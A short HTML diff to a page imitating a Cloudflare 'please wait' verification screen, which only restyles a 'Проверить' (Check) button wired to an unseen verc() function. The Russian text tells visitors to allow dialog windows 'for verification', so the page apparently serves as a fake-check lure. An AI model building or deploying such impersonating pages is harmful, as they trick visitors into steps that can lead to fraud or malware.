@@ -98,7 +98,7 @@
               <div class="cf-highlight-inverse cf-form-stacked">
                 
   
-    <div id="cf-please-wait" style="border-radius: 10px;">
+    <div id="cf-please-wait">
 	<br>
       <div id="spinner">
         <div id="cf-bubbles">
@@ -107,7 +107,11 @@
             <div class="bubbles"></div>
         </div>
       </div>
-      <br><p data-translate="please_wait" id="cf-spinner-please-wait" style="font-size: 17px;">После выполненных действий <br>нажмите на кнопку...<p style="font-size: 19px;" class="cf-alert cf-alert-error">Разрешите создание диалоговых окон для проверки. Это не займёт много времени.</p></p><button style="font-size: 19px;" onclick="verc()">Проверить</button><br>
+	  <style>
+	    .default-button{padding:5px 20px;border:1px solid #e34761;background-color:#a1b5ff;color:white;font-size:22px;cursor:pointer;transition:0.3s linear;}
+        .default-button:hover{background-color:#edf1ff;color:#829bf5;}
+	  </style>
+      <br><p data-translate="please_wait" id="cf-spinner-please-wait" style="font-size: 17px;">После выполненных действий <br>нажмите на кнопку...<p style="font-size: 19px;" class="cf-alert cf-alert-error">Разрешите создание диалоговых окон для проверки. Это не займёт много времени.</p></p><button style="font-size: 19px;" class="default-button" onclick="verc()">Проверить</button><br>
       <p data-translate="redirecting" id="cf-spinner-redirecting" style="display:none">Redirecting...</p>
       </div>
   
